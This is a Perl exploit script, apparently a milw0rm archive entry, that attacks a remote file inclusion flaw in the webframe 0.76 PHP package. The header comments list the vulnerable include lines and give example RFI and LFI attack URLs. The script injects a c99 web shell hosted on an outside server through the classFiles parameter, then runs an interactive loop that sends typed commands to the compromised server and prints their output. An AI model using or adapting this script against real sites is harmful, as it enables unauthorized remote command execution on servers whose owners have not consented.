#!/usr/bin/perl
####################################################################
#********************************************************************************
#                                             webframe 0.76 RFI Vulnerability
#
#********************************************************************************
#Author: ahmadbady  [kivi_hacker666@yahoo.com]
#
#from[iran]
#
#download from:http://downloads.sourceforge.net/phpwebframe/webframe-0.76-src.tar.gz?modtime=1155546760&big_mirror=0
#
#
#vul: /mod/admin/doc/index.php line 3;
# include_once "$classFiles/xml.php";
#==============================================
#vul2:/mod/index.php line 5,7,9,11,13;
#
#include_once "$classFiles/table.php";
#//html class
#include_once "$classFiles/html.php"; 
#//Database class
#include_once "$classFiles/mysql.php";
#//Form class
#include_once "$classFiles/form.php";
#//Language file
#include "../$currentmod/lang/$LANG.php"; ----> = lfi
#============================================================
#vul3: /mod/base/menu.php line 17;
#
#  include_once "$classFiles/mysql.php
#============================================================
#-----------------------------------------------------
#
#xpl rfi:
#
#http://127.0..0.1/path/mod/admin/doc/index.php?classFiles=[shell.txt?]
#
#http://127.0.0.1/path/mod/index.php?classFiles=[shell.txt?]
#
#http://127.0.0..1/path/mod/base/menu.php?classFiles=[shell.txt?]
#
#xpl lfi:
#
#http://127.0.0.1/path/mod/index.php?currentmod=[Lfi]
#
#http://127.0.0.1/path/mod/index.php?LANG=[Lfi]
#
#***************************************************
# milw0rm.com [2009-02-09]

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] webframe 0.76 RFI Vulnerability with (c99) Exploit\n\n";
	print "[x] FOUND BY: ahmadbady  [kivi_hacker666@yahoo.com] from iran\n";
	print "[x] BUG: Remote File Include (RFI)\n";
	print "[x] CMS:  webframe 0.76\n";
	
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN".
	print "[x] http://solidmecca.co.nr".
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n".


	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/path/mod/admin/doc/index.php?classFiles=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

